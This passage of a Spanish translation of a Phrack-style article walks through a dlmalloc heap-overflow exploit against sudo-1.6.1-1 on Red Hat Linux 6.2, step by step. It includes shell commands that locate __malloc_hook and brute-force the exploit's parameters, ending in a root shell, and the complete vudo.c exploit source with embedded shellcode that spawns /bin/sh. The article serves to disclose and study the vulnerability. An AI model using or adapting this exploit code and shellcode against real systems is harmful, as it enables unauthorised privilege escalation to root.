+malloc( 13 ): 0x08072680;
+malloc( 16 ): 0x08072698;
+
+Los buffers de 13, 16, 13 y 16 bytes fueron asignados despues del final
+del buffer de 16 bytes asignado arriba (cuya direccion es 0x08072638),
+en el remainder del agujero de 8200 bytes. La direccion del trozo
+`last_remainder' resultante, el trozo libre guardado despues del final
+del buffer 0x08072698 y antes del buffer 0x08072c90 buffer, es igual a
+0x080726a8 (mem2chunk(0x08072698) + request2size(16)), y su tama~o
+efectivo es igual a 1504 (mem2chunk(0x08072c90) - 0x080726a8) bytes.
+
+Las siguientes series de llamadas dlmalloc son llevadas a cabo por
+la funcion setenv(3) para crear la variable de entorno PS1:
+
+realloc( 0x0807a900, 27484 ): 0x0807a900;
+malloc( 1756 ): 0x08071510;
+malloc( 16 ): 0x08071bf0;
+
+El buffer de 1756 bytes fue asignado (durante el paso[3.1] en malloc(3))
+para contener la variable de entorno PS1 (cuyo tama~o fue computado
+por el exploit Vudo), y fue guardado al principio del agujero de 4339 bytes
+creado arriba.
+
+El remainder de este agujero por lo tanto se convierte en el nuevo
+trozo `last_remainder', y el viejo trozo `last_remainder', cuyo
+tama~o efectivo es igual a 1504 bytes, fue por lo tanto ubicado en
+su lista doblemente linkeada (la lista asociada con el numero bin 79)
+durante el paso[2.2.2] en malloc(3).
+
+El buffer de 16 bytes fue asignado durante el paso[2.1] en malloc(3),
+en el remainder del agujero de 4339 bytes.
+
+malloc( 640 ): 0x08071c08;
+malloc( 400 ): 0x08071e90;
+
+Los buffers de 640 y 400 bytes fueron tambien asignados, durante el
+paso[2.1] en malloc(3), en el remainder del agujero de 4339 bytes.
+
+malloc( 1600 ): 0x08072ca8;
+
+Este buffer de 1600 bytes, asignado en el paso[3.1] en malloc(3), fue
+guardado al principio del agujero de 27648 bytes creado arriba.
+El remainder de este agujero por lo tanto se convierte en el nuevo
+trozo `last_remainder', y el antiguo trozo `last_remainder', el
+remainder del agujero de 4339 bytes, fue ubicado en su bin en el paso [2.2.2]
+en malloc(3).
+
+Ya que el tama~o efectivo de este antiguo `last_remainder' es igual a
+1504 (request2size(4339) - request2size(1756) - request2size(16)
+- request2size(640) - request2size(400)) bytes, fue ubicado en el numero
+bin 79 por frontlink(), en frente del trozo de 1504 bytes ya insertado en
+este bin descripto arriba.
+
+La direccion de ese antiguo trozo `last_remainder', 0x08072020
+(mem2chunk(0x08071e90) + request2size(400)), contiene dos caracteres
+ESPACIO, necesitados por el exploit Vudo para explotar exitosamente
+la vulnerabilidad Sudo, como se detalla a continuacion. Esta direccion
+muy especial fue obtenida gracias a la variable de entorno TZ mencionada
+arriba.
+
+malloc( 40 ): 0x080732f0;
+malloc( 16386 ): 0x08073320;
+malloc( 13 ): 0x08077328;
+free( 0x08077328 );
+malloc( 5 ): 0x08077328;
+free( 0x08077328 );
+malloc( 6 ): 0x08077328;
+free( 0x08071458 );
+malloc( 100 ): 0x08077338;
+realloc( 0x08077338, 19 ): 0x08077338;
+malloc( 100 ): 0x08077350;
+realloc( 0x08077350, 21 ): 0x08077350;
+free( 0x08077338 );
+free( 0x08077350 );
+
+Todos estos buffers fueron asignados, durante el paso[2.1] en malloc(3),
+en el remainder del agujero de 27648 bytes creado arriba.
+
+Las siguientes series de llamadas dlmalloc son llevadas a cabo por
+easprintf(), un wrapper a vasprintf(3), para asignar espacio para el buffer
+del msg:
+
+malloc( 100 ): 0x08077338;
+malloc( 300 ): 0x080773a0;
+free( 0x08077338 );
+malloc( 700 ): 0x080774d0;
+free( 0x080773a0 );
+malloc( 1500 ): 0x080726b0;
+free( 0x080774d0 );
+malloc( 3100 ): 0x08077338;
+free( 0x080726b0 );
+malloc( 6300 ): 0x08077f58;
+free( 0x08077338 );
+realloc( 0x08077f58, 4795 ): 0x08077f58;
+
+Para asignar el buffer de 1500 bytes, cuyo tama~o efectivo es igual a
+1504 (request2size(1500)) bytes, malloc(3) descarto el paso[1.2] y
+devolvio (en el paso[1.2.2]) el ultimo trozo en el numero bin 79,
+y por lo tanto dejo el trozo 0x08072020 solo en este bin.
+
+Pero una vez sin usar, este buffer de 1500 bytes fue ubicado de regreso
+en el numero bin 79 por free(3), en el paso[4.3], en frente del trozo
+0x08072020 ya guardado en este bin.
+
+El buffer de 6300 bytes fue asignado durante el paso[2.2.1] en malloc(3).
+Efectivamente, el tama~o del agujero de 27468 bytes fue cuidadosamente
+elegido por el atacante (via el tercer argumento pasado al exploit Vudo)
+entonces eso, una vez asignado, el buffer de 6300 bytes podria llenar
+este agujero.
+
+Finalmente, el buffer de 6300 bytes fue reasignado para menos espacio,
+durante el paso[4.1] del algoritmo realloc(3). El buffer reasignado
+fue creado para contener el buffer del msg, y el trozo libre procesado
+por chunk_free() durante el paso [4.1] del algoritmo realloc(3) fue
+ubicado en su lista doblemente linkeada. Ya que el tama~o efectivo de
+este trozo libre es igual a 1504 (request2size(6300) - request2size(4795))
+bytes, fue ubicado en el numero bin 79, en frente de los dos trozos libres
+ya guardados en este bin.
+
+Las siguientes series de llamadas dlmalloc son llevadas a cabo por la
+primer llamada a syslog(3), durante la ejecucion de la funcion do_syslog():
+
+malloc( 192 ): 0x08072028;
+malloc( 8192 ): 0x08081460;
+realloc( 0x08081460, 997 ): 0x08081460;
+free( 0x08072028 );
+free( 0x08081460 );
+
+El buffer de 192 bytes fue asignado durante el paso[3.1] del algoritmo
+malloc(3), y el trozo procesado fue el ultimo trozo en el numero bin
+79 (el trozo 0x08072020).
+
+Una vez sin usar, el buffer de 192 bytes fue consolidado (en el paso[4.2]
+en free(3) con el remainder del trozo de 1504 bytes previamente dividido,
+y el trozo unido resultante fue ubicado de regreso (en el paso[4.3] en
+free(3)) en numero bin 79, en frente de los dos trozos libres ya guardados
+en este bin.
+
+EL campo bk del trozo de memoria ubicado inmediatamente despues del buffer
+del msg fue por consiguiente sobreescrito por unlink() para apuntar al
+trozo 0x08072020.
+
+Las siguientes series de llamadas dlmalloc son llevadas a cabo por
+la segunda llamada a syslog(3), durante la ejecucion de la funcion
+do_syslog():
+
+malloc( 192 ): 0x080726b0;
+malloc( 8192 ): 0x08081460;
+realloc( 0x08081460, 1018 ): 0x08081460;
+free( 0x080726b0 );
+free( 0x08081460 );
+
+El buffer de 192 bytes fue asignado durante el paso[3.1] del algoritmo
+malloc(3), y el trozo procesado fue el ultimo trozo en el numero bin 79
+(el trozo 0x080726a8).
+
+El campo bk del numero bin 79 (el puntero al ultimo trozo libre en la
+lista doblemente linkeada asociada) fue por lo tanto sobreescrito por
+unlink() con un puntero al trozo de memoria ubicado inmediatamente
+despues del final del buffer del msg.
+
+Una vez sin usar, el buffer de 192 bytes fue consolidado (en el paso[4.2]
+en free(3)) con el remainder del trozo de 1504 bytes previamente dividido,
+y el trozo resultante unido fue ubicado de regreso (en el paso[4.3] en
+free(3)) en el numero bin 79, en frente de los dos trozos libres ya guardados
+en este bin.
+
+Tan pronto como esta segunda llamada a syslog(3) fue completada, el loop[7]
+de la funcion do_syslog() pusheado al puntero p despues del caracter
+terminado en NUL asociado con el buffer del msg, hasta p apuntado al
+primer caracter ESPACIO encontrado. El primer caracter ESPACIO encontrado
+fue por supuesto el byte menos significante del campo bk (sigue igual a
+0x08072020) asociado con el trozo ubicado inmediatamente despues del msg.
+
+La funcion do_syslog() paso exitosamente el test[2] ya que no fue encontrado
+ningun byte NUL entre p y (p + MAXSYSLOGLEN) (efectivamente, esta area
+de memoria es llenada con el contenido del buffer de 27648 bytes
+previamente asignado y liberado: los punteros a las variables de entorno
+pasaron a Sudo por el exploit, y esas variables de entorno fueron
+construidas por el exploit para evitar caracteres NUL y ESPACIO en sus
+direcciones).
+
+El byte sobreescrito con un byte NUL en line[5] en do_syslog() es el primer
+caracter ESPACIO encontrado cuando ocurria el loop desde (p + MAXSYSLOGLEN)
+hacia abajo a p. Por supuesto este primer caracter ESPACIO encontrado fue
+el segundo byte del campo bk (igual a 0x08072020) asociado con el trozo
+ubicado inmediatamente despues del msg, ya que ningun otro caracter
+ESPACIO puede ser encontrado en el area de memoria entre p y
+(p + MAXSYSLOGLEN), como se detallo arriba.
+
+El campo bk del trozo ubicado inmediatamente despues del msg fue por
+lo tanto corrompido (su nuevo valor es igual a 0x08070020), para apuntar
+a la mitad de la copia de la variable de entorno SHELL mencionada arriba,
+antes de las siguientes series de llamadas dlmalloc, llevadas a cabo por
+la tercera llamada a syslog(3), fueron descartadas:
+
+malloc( 192 ): 0x08079218;
+malloc( 8192 ): 0x08081460;
+realloc( 0x08081460, 90 ): 0x08081460;
+free( 0x08079218 );
+free( 0x08081460 );
+
+El buffer de 192 bytes fue asignado durante el paso[3.1] del algoritmo
+malloc(3), y el trozo procesado fue el ultimo trozo en el numero bin 79
+(el trozo ubicado inmediatamente despues del msg).
+
+El campo bk del numero bin 79 (el puntero al ultimo trozo libre en la
+lista doblemente linkeada asociada) fue por lo tanto sobreescrito por
+unlink() con el campo bk corrompido del trozo ubicado inmediatamente
+despues del msg.
+
+Una vez sin usar, el buffer de 192 bytes fue consolidado (en el paso[4.2]
+en free(3)) con el remainder del trozo de 1504 bytes previamente dividido,
+y el trozo unido resultante fue ubicado de regreso (en el paso[4.3] en
+free(3)) en el numero bin 79, en frente de los dos trozos libres ya guardados
+en este bin (pero uno de esos dos trozos es por supuesto un trozo falso
+apuntado a por el campo bk 0x08070020 corrompido).
+
+Antes de que las siguientes series de llamadas dlmalloc sean llevadas a cabo,
+por la cuarta llamada a syslog(3), el caracter ESPACIO erroneamente
+sobreescrito fue restaurado en line[6] por do_syslog(), pero ya que el
+puntero bk corrompido fue copiado al campo bk del numero bin 79 antes,
+el exploit Vudo quiere da~ar permanentemente las estructuras internas
+usadas por dlmalloc():
+
+malloc( 192 ): 0xbfffff1e;
+malloc( 8192 ): 
+
+Para asignar este buffer de 192 bytes, el paso[1.2] del algoritmo malloc(3)
+fue descartado, y un trozo de memoria imaginario, apuntado a por el campo
+bk corrompido, guardado en la mitad de la copia de la variable de entorno,
+fue procesado. Pero ya que este trozo falso era demasiado peque~o
+(en efecto, su campo de tama~o es igual a 0xbfffff1e, un entero negativo),
+su campo bk (igual a 0xbfffff1e) fue seguido, para otro trozo de memoria
+falso guardado en la pila, cuyo tama~o es exactamente 200 (request2size(192))
+bytes.
+
+Este trozo falso fue por lo tanto sacado de su lista doblemente linkeada
+imaginaria, permitiendo al atacante aplicar la tecnica unlink() descripta
+en 3.6.1 y sobreescribir el pirateo de debugging __malloc_hook con la
+direccion de un shellcode especial guardado en algun lugar del heap
+(para desviar el patch para el kernel de Linux del Openwall Project).
+
+Este shellcode fue subsecuentemente ejecutado, al principio de la ultima
+llamada a malloc(3), ya que el pirateo de debugging __malloc_hook
+corrompido fue leido y ejecutado.
+
+----[ 4.2 - La practica ]-----------------------------------------------
+
+Para ganar privilegios de root exitosamente via el exploit Sudo, un
+usuario no necesita necesariamente estar presente en el archivo de
+sudoers, pero tiene que saber su password de usuario. Necesitan
+adicionalmente para proveer tres argumentos de linea de comandos:
+
+- la direccion del puntero de funcion __malloc_hook, que varia de un
+sistema a otro pero puede ser determinada;
+
+- el tama~o del buffer tz, que varia levemente de un sistema a otro
+y tiene que ser sacado por fuerza bruta;
+
+- el tama~o del buffer envp, que varia levemente de un sistema a otro
+y tiene que ser sacado por fuerza bruta.
+
+Un tipico cul^H^H^H^Hsesion Vudu empieza con un paso de autenticacion,
+un paso de computacion __malloc_hook, y eventualmente un paso de
+fuerza bruta, basado en los ejemplos tz y envp por el uso del mensaje
+Vudo (afortundamente el usuario no necesita proveer su password cada
+vez que Sudo es ejecutado durante el paso de fuerza bruta porque
+se autenticaron justo antes):
+
+$ /usr/bin/sudo www.MasterSecuritY.fr
+Password:
+maxx is not in the sudoers file.  This incident will be reported.
+
+$ LD_TRACE_LOADED_OBJECTS=1 /usr/bin/sudo | grep /lib/libc.so.6
+        libc.so.6 => /lib/libc.so.6 (0x00161000)
+$ nm /lib/libc.so.6 | grep __malloc_hook
+000ef1dc W __malloc_hook
+$ perl -e 'printf "0x%08x\n", 0x00161000 + 0x000ef1dc'
+0x002501dc
+
+$ for tz in `seq 62587 8 65531`
+do
+for envp in `seq 6862 2 6874`
+do
+./vudo 0x002501dc $tz $envp
+done
+done
+maxx is not in the sudoers file.  This incident will be reported.
+maxx is not in the sudoers file.  This incident will be reported.
+maxx is not in the sudoers file.  This incident will be reported.
+maxx is not in the sudoers file.  This incident will be reported.
+maxx is not in the sudoers file.  This incident will be reported.
+maxx is not in the sudoers file.  This incident will be reported.
+maxx is not in the sudoers file.  This incident will be reported.
+maxx is not in the sudoers file.  This incident will be reported.
+maxx is not in the sudoers file.  This incident will be reported.
+maxx is not in the sudoers file.  This incident will be reported.
+bash#
+
+<++> vudo.c !32ad14e5
+/*
+ * vudo.c versus Red Hat Linux/Intel 6.2 (Zoot) sudo-1.6.1-1
+ * Copyright (C) 2001 Michel "MaXX" Kaempf <maxx@synnergy.net>
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or (at
+ * your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+ * General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+ * USA
+ */
+
+#include <limits.h>
+#include <paths.h>
+#include <pwd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+typedef struct malloc_chunk {
+    size_t prev_size;
+    size_t size;
+    struct malloc_chunk * fd;
+    struct malloc_chunk * bk;
+} * mchunkptr;
+
+#define SIZE_SZ sizeof(size_t)
+#define MALLOC_ALIGNMENT ( SIZE_SZ + SIZE_SZ )
+#define MALLOC_ALIGN_MASK ( MALLOC_ALIGNMENT - 1 )
+#define MINSIZE sizeof(struct malloc_chunk)
+
+/* shellcode */
+#define sc \
+    /* jmp */ \
+    "\xeb\x0appssssffff" \
+    /* setuid */ \
+    "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" \
+    /* setgid */ \
+    "\x31\xdb\x89\xd8\xb0\x2e\xcd\x80" \
+    /* execve */ \
+    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
+    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
+    "\x80\xe8\xdc\xff\xff\xff/bin/sh"
+
+#define MAX_UID_T_LEN 10
+#define MAXSYSLOGLEN 960
+#define IFCONF_BUF r2s( 8200 )
+#define SUDOERS_FP r2s( 176 )
+#define VASPRINTF r2s( 6300 )
+#define VICTIM_SIZE r2s( 1500 )
+#define SUDO "/usr/bin/sudo"
+#define USER_CWD "/"
+#define MESSAGE 19 /* "comando not allowed" o "user NOT in sudoers" */
+#define USER_ARGS ( VASPRINTF-VICTIM_SIZE-SIZE_SZ - 1 - (MAXSYSLOGLEN+1) )
+#define PREV_SIZE 0x5858614d
+#define SIZE r2s( 192 )
+#define SPACESPACE 0x08072020
+#define POST_PS1 ( r2s(16) + r2s(640) + r2s(400) )
+#define BK ( SPACESPACE - POST_PS1 + SIZE_SZ - sizeof(sc) )
+#define STACK ( 0xc0000000 - 4 )
+#define PRE_SHELL "SHELL="
+#define MAXPATHLEN 4095
+#define SHELL ( MAXPATHLEN - 1 )
+#define PRE_SUDO_PS1 "SUDO_PS1="
+#define PRE_TZ "TZ="
+#define LIBC "/lib/libc.so.6"
+#define TZ_FIRST ( MINSIZE - SIZE_SZ - 1 )
+#define TZ_STEP ( MALLOC_ALIGNMENT / sizeof(char) )
+#define TZ_LAST ( 0x10000 - SIZE_SZ - 1 )
+#define POST_IFCONF_BUF (r2s(1600)+r2s(40)+r2s(16386)+r2s(3100)+r2s(6300))
+#define ENVP_FIRST ( ((POST_IFCONF_BUF - SIZE_SZ) / sizeof(char *)) - 1 )
+#define ENVP_STEP ( MALLOC_ALIGNMENT / sizeof(char *) )
+
+/* request2size() */
+size_t
+r2s( size_t request )
+{
+    size_t size;
+
+    size = request + ( SIZE_SZ + MALLOC_ALIGN_MASK );
+    if ( size < (MINSIZE + MALLOC_ALIGN_MASK) ) {
+        size = MINSIZE;
+    } else {
+        size &= ~MALLOC_ALIGN_MASK;
+    }
+    return( size );
+}
+
+/* nul() */
+int
+nul( size_t size )
+{
+    char * p = (char *)( &size );
+
+    if ( p[0] == '\0' || p[1] == '\0' || p[2] == '\0' || p[3] == '\0' ) {
+        return( -1 );
+    }
+    return( 0 );
+}
+
+/* nul_or_space() */
+int
+nul_or_space( size_t size )
+{
+    char * p = (char *)( &size );
+
+    if ( p[0] == '\0' || p[1] == '\0' || p[2] == '\0' || p[3] == '\0' ) {
+        return( -1 );
+    }
+    if ( p[0] == ' ' || p[1] == ' ' || p[2] == ' ' || p[3] == ' ' ) {
+        return( -1 );
+    }
+    return( 0 );
+}
+
+typedef struct vudo_s {
+    /* command line */
+    size_t __malloc_hook;
+    size_t tz;
+    size_t envp;
+
+    size_t setenv;
+    size_t msg;
+    size_t buf;
+    size_t NewArgv;
+
+    /* execve */
+    char ** execve_argv;
+    char ** execve_envp;
+} vudo_t;
+
+/* vudo_setenv() */
+size_t
+vudo_setenv( uid_t uid )
+{
+    struct passwd * pw;
+    size_t setenv;
+    char idstr[ MAX_UID_T_LEN + 1 ];
+
+    /* pw */
+    pw = getpwuid( uid );
+    if ( pw == NULL ) {
+        return( 0 );
+    }
+
+    /* SUDO_COMMAND */
+    setenv = r2s( 16 );
+
+    /* SUDO_USER */
+    setenv += r2s( strlen("SUDO_USER=") + strlen(pw->pw_name) + 1 );
+    setenv += r2s( 16 );
+
+    /* SUDO_UID */
+    sprintf( idstr, "%ld", (long)(pw->pw_uid) );
+    setenv += r2s( strlen("SUDO_UID=") + strlen(idstr) + 1 );
+    setenv += r2s( 16 );
+
+    /* SUDO_GID */
+    sprintf( idstr, "%ld", (long)(pw->pw_gid) );
+    setenv += r2s( strlen("SUDO_GID=") + strlen(idstr) + 1 );
+    setenv += r2s( 16 );
+
+    return( setenv );
+}
+
+/* vudo_msg() */
+size_t
+vudo_msg( vudo_t * p_v )
+{
+    size_t msg;
+
+    msg = ( MAXSYSLOGLEN + 1 ) - strlen( "shell " ) + 3;
+    msg *= sizeof(char *);
+    msg += SIZE_SZ - IFCONF_BUF + p_v->setenv + SUDOERS_FP + VASPRINTF;
+    msg /= sizeof(char *) + 1;
+
+    return( msg );
+}
+
+/* vudo_buf() */
+size_t
+vudo_buf( vudo_t * p_v )
+{
+    size_t buf;
+
+    buf = VASPRINTF - VICTIM_SIZE - p_v->msg;
+
+    return( buf );
+}
+
+/* vudo_NewArgv() */
+size_t
+vudo_NewArgv( vudo_t * p_v )
+{
+    size_t NewArgv;
+
+    NewArgv = IFCONF_BUF-VICTIM_SIZE-p_v->setenv-SUDOERS_FP-p_v->buf;
+
+    return( NewArgv );
+}
+
+/* vudo_execve_argv() */
+char **
+vudo_execve_argv( vudo_t * p_v )
+{
+    size_t pudding;
+    char ** execve_argv;
+    char * p;
+    char * user_tty;
+    size_t size;
+    char * user_runas;
+    int i;
+    char * user_args;
+
+    /* pudding */
+    pudding = ( (p_v->NewArgv - SIZE_SZ) / sizeof(char *) ) - 3;
+
+    /* execve_argv */
+    execve_argv = malloc( (4 + pudding + 2) * sizeof(char *) );
+    if ( execve_argv == NULL ) {
+        return( NULL );
+    }
+
+    /* execve_argv[ 0 ] */
+    execve_argv[ 0 ] = SUDO;
+
+    /* execve_argv[ 1 ] */
+    execve_argv[ 1 ] = "-s";
+
+    /* execve_argv[ 2 ] */
+    execve_argv[ 2 ] = "-u";
+
+    /* user_tty */
+    if ( (p = ttyname(STDIN_FILENO)) || (p = ttyname(STDOUT_FILENO)) ) {
+        if ( strncmp(p, _PATH_DEV, sizeof(_PATH_DEV) - 1) == 0 ) {
+            p += sizeof(_PATH_DEV) - 1;
+        }
+        user_tty = p;
+    } else {
+        user_tty = "unknown";
+    }
+
+    /* user_cwd */
+    if ( chdir(USER_CWD) == -1 ) {
+        return( NULL );
+    }
+
+    /* user_runas */
+    size = p_v->msg;
+    size -= MESSAGE;
+    size -= strlen( " ; TTY= ; PWD= ; USER= ; COMMAND=" );
+    size -= strlen( user_tty );
+    size -= strlen( USER_CWD );
+    user_runas = malloc( size + 1 );
+    if ( user_runas == NULL ) {
+        return( NULL );
+    }
+    memset( user_runas, 'M', size );
+    user_runas[ size ] = '\0';
+
+    /* execve_argv[ 3 ] */
+    execve_argv[ 3 ] = user_runas;
+
+    /* execve_argv[ 4 ] .. execve_argv[ (4 + pudding) - 1 ] */
+    for ( i = 4; i < 4 + pudding; i++ ) {
+        execve_argv[ i ] = "";
+    }
+
+    /* user_args */
+    user_args = malloc( USER_ARGS + 1 );
+    if ( user_args == NULL ) {
+        return( NULL );
+    }
+    memset( user_args, 'S', USER_ARGS );
+    user_args[ USER_ARGS ] = '\0';
+
+    /* execve_argv[ 4 + pudding ] */
+    execve_argv[ 4 + pudding ] = user_args;
+
+    /* execve_argv[ (4 + pudding) + 1 ] */
+    execve_argv[ (4 + pudding) + 1 ] = NULL;
+
+    return( execve_argv );
+}
+
+/* vudo_execve_envp() */
+char **
+vudo_execve_envp( vudo_t * p_v )
+{
+    size_t fd;
+    char * chunk;
+    size_t post_pudding;
+    int i;
+    size_t pudding;
+    size_t size;
+    char * post_chunk;
+    size_t p_chunk;
+    char * shell;
+    char * p;
+    char * sudo_ps1;
+    char * tz;
+    char ** execve_envp;
+    size_t stack;
+
+    /* fd */
+    fd = p_v->__malloc_hook - ( SIZE_SZ + SIZE_SZ + sizeof(mchunkptr) );
+
+    /* trozo */
+    chunk = malloc( MINSIZE + 1 );
+    if ( chunk == NULL ) {
+        return( NULL );
+    }
+    ( (mchunkptr)chunk )->prev_size = PREV_SIZE;
+    ( (mchunkptr)chunk )->size = SIZE;
+    ( (mchunkptr)chunk )->fd = (mchunkptr)fd;
+    ( (mchunkptr)chunk )->bk = (mchunkptr)BK;
+    chunk[ MINSIZE ] = '\0';
+
+    /* post_pudding */
+    post_pudding = 0;
+    for ( i = 0; i < MINSIZE + 1; i++ ) {
+        if ( chunk[i] == '\0' ) {
+            post_pudding += 1;
+        }
+    }
+
+    /* pudding */
+    pudding = p_v->envp - ( 3 + post_pudding + 2 );
+
+    /* post_chunk */
+    size = ( SIZE - 1 ) - 1;
+    while ( nul(STACK - sizeof(SUDO) - (size + 1) - (MINSIZE + 1)) ) {
+        size += 1;
+    }
+    post_chunk = malloc( size + 1 );
+    if ( post_chunk == NULL ) {
+        return( NULL );
+    }
+    memset( post_chunk, 'Y', size );
+    post_chunk[ size ] = '\0';
+
+    /* p_chunk */
+    p_chunk = STACK - sizeof(SUDO) - (strlen(post_chunk)+1) - (MINSIZE+1);
+
+    /* shell */
+    shell = malloc( strlen(PRE_SHELL) + SHELL + 1 );
+    if ( shell == NULL ) {
+        return( NULL );
+    }
+    p = shell;
+    memcpy( p, PRE_SHELL, strlen(PRE_SHELL) );
+    p += strlen( PRE_SHELL );
+    while ( p < shell + strlen(PRE_SHELL) + (SHELL & ~(SIZE_SZ-1)) ) {
+        *((size_t *)p) = p_chunk;
+        p += SIZE_SZ;
+    }
+    while ( p < shell + strlen(PRE_SHELL) + SHELL ) {
+        *(p++) = '2';
+    }
+    *p = '\0';
+
+    /* sudo_ps1 */
+    size = p_v->buf;
+    size -= POST_PS1 + VICTIM_SIZE;
+    size -= strlen( "PS1=" ) + 1 + SIZE_SZ;
+    sudo_ps1 = malloc( strlen(PRE_SUDO_PS1) + size + 1 );
+    if ( sudo_ps1 == NULL ) {
+        return( NULL );
+    }
+    memcpy( sudo_ps1, PRE_SUDO_PS1, strlen(PRE_SUDO_PS1) );
+    memset( sudo_ps1 + strlen(PRE_SUDO_PS1), '0', size + 1 - sizeof(sc) );
+    strcpy( sudo_ps1 + strlen(PRE_SUDO_PS1) + size + 1 - sizeof(sc), sc );
+
+    /* tz */
+    tz = malloc( strlen(PRE_TZ) + p_v->tz + 1 );
+    if ( tz == NULL ) {
+        return( NULL );
+    }
+    memcpy( tz, PRE_TZ, strlen(PRE_TZ) );
+    memset( tz + strlen(PRE_TZ), '0', p_v->tz );
+    tz[ strlen(PRE_TZ) + p_v->tz ] = '\0';
+
+    /* execve_envp */
+    execve_envp = malloc( p_v->envp * sizeof(char *) );
+    if ( execve_envp == NULL ) {
+        return( NULL );
+    }
+
+    /* execve_envp[ p_v->envp - 1 ] */
+    execve_envp[ p_v->envp - 1 ] = NULL;
+
+    /* execve_envp[3+pudding] .. execve_envp[(3+pudding+post_pudding)-1] */
+    p = chunk;
+    for ( i = 3 + pudding; i < 3 + pudding + post_pudding; i++ ) {
+        execve_envp[ i ] = p;
+        p += strlen( p ) + 1;
+    }
+
+    /* execve_envp[ 3 + pudding + post_pudding ] */
+    execve_envp[ 3 + pudding + post_pudding ] = post_chunk;
+
+    /* execve_envp[ 0 ] */
+    execve_envp[ 0 ] = shell;
+
+    /* execve_envp[ 1 ] */
+    execve_envp[ 1 ] = sudo_ps1;
+
+    /* execve_envp[ 2 ] */
+    execve_envp[ 2 ] = tz;
+
+    /* execve_envp[ 3 ] .. execve_envp[ (3 + pudding) - 1 ] */
+    i = 3 + pudding;
+    stack = p_chunk;
+    while ( i-- > 3 ) {
+        size = 0;
+        while ( nul_or_space(stack - (size + 1)) ) {
+            size += 1;
+        }
+        if ( size == 0 ) {
+            execve_envp[ i ] = "";
+        } else {
+            execve_envp[ i ] = malloc( size + 1 );
+            if ( execve_envp[i] == NULL ) {
+                return( NULL );
+            }
+            memset( execve_envp[i], '1', size );
+            ( execve_envp[ i ] )[ size ] = '\0';
+        }
+        stack -= size + 1;
+    }
+
+    return( execve_envp );
+}
+
+/* usage() */
+void
+usage( char * fn )
+{
+    printf(
+        "%s versus Red Hat Linux/Intel 6.2 (Zoot) sudo-1.6.1-1\n",
+        fn
+    );
+    printf(
+        "Copyright (C) 2001 Michel \"MaXX\" Kaempf <maxx@synnergy.net>\n"
+    );
+    printf( "\n" );
+
+    printf( "* Usage: %s __malloc_hook tz envp\n", fn );
+    printf( "\n" );
+
+    printf( "* Example: %s 0x002501dc 62595 6866\n", fn );
+    printf( "\n" );
+
+    printf( "* __malloc_hook:\n" );
+    printf( "  $ LD_TRACE_LOADED_OBJECTS=1 %s | grep %s\n", SUDO, LIBC );
+    printf( "  $ objdump --syms %s | grep __malloc_hook\n", LIBC );
+    printf( "  $ nm %s | grep __malloc_hook\n", LIBC );
+    printf( "\n" );
+
+    printf( "* tz:\n" );
+    printf( "  - first: %u\n", TZ_FIRST );
+    printf( "  - step: %u\n", TZ_STEP );
+    printf( "  - last: %u\n", TZ_LAST );
+    printf( "\n" );
+
+    printf( "* envp:\n" );
+    printf( "  - first: %u\n", ENVP_FIRST );
+    printf( "  - step: %u\n", ENVP_STEP );
+}
+
+/* main() */
+int
+main( int argc, char * argv[] )
+{
+    vudo_t vudo;
+
+    /* argc */
+    if ( argc != 4 ) {
+        usage( argv[0] );
+        return( -1 );
+    }
+
+    /* vudo.__malloc_hook */
+    vudo.__malloc_hook = strtoul( argv[1], NULL, 0 );
+    if ( vudo.__malloc_hook == ULONG_MAX ) {
+        return( -1 );
+    }
+
+    /* vudo.tz */
+    vudo.tz = strtoul( argv[2], NULL, 0 );
+    if ( vudo.tz == ULONG_MAX ) {
+        return( -1 );
+    }
+
+    /* vudo.envp */
+    vudo.envp = strtoul( argv[3], NULL, 0 );
+    if ( vudo.envp == ULONG_MAX ) {
+        return( -1 );
+    }
+
+    /* vudo.setenv */
+    vudo.setenv = vudo_setenv( getuid() );
+    if ( vudo.setenv == 0 ) {
+        return( -1 );
+    }
+
+    /* vudo.msg */
+    vudo.msg = vudo_msg( &vudo );
+
+    /* vudo.buf */
+    vudo.buf = vudo_buf( &vudo );
+
+    /* vudo.NewArgv */
+    vudo.NewArgv = vudo_NewArgv( &vudo );
+
+    /* vudo.execve_argv */
+    vudo.execve_argv = vudo_execve_argv( &vudo );
+    if ( vudo.execve_argv == NULL ) {
+        return( -1 );
+    }
+
+    /* vudo.execve_envp */
+    vudo.execve_envp = vudo_execve_envp( &vudo );
+    if ( vudo.execve_envp == NULL ) {
+        return( -1 );
+    }
+
+    /* execve */
+    execve( (vudo.execve_argv)[0], vudo.execve_argv, vudo.execve_envp );
+    return( -1 );
+}
+<-->
+
+--[ 5 - Agradecimientos ]-----------------------------------------------
+
+Gracias a Todd Miller por la fascinante vulnerabilidad, gracias a Chris
+Wilson por el descubrimiento de la vulnerabilidad, gracias a Doug Lea
+por el excelente asignador, y gracias a Solar Designer por la tecnica
+unlink().
+
+Gracias a Synnergy por el invaluable soporte, los varios sistemas operativos
+y la gran paciencia... gracias por todo. Gracias a VIA (y especialmente
+a BBP y Kaliban) y gracias al grupo eXperts (y particularmente a Fred y Nico)
+por la cuidadosa (dolorosa? :) releida.
+
+Gracias al movimiento antiSecurity (y peculiarmente a JimJones y Portal)
+por las las interesantes discusiones de cosas descubiertas. Gracias a
+MasterSecuritY ya que mi cerebro trabajo inconscientemente en la
+vulnerabilidad Sudo durante el tiempo de trabajo :)
+
+Gracias a Phrack por el trabajo profesional, y saludos a superluck ;)
+
+
+--[ 6 - Outroduccion ]--------------------------------------------------
+
+I stand up next to a mountain and chop it down with the edge of my hand.
+-- Jimi Hendrix (Voodoo Chile (slight return))
+
+The voodoo, who do, what you don't dare do people.
+-- The Prodigy (Voodoo People)
+
+I do Voodoo, but not on You
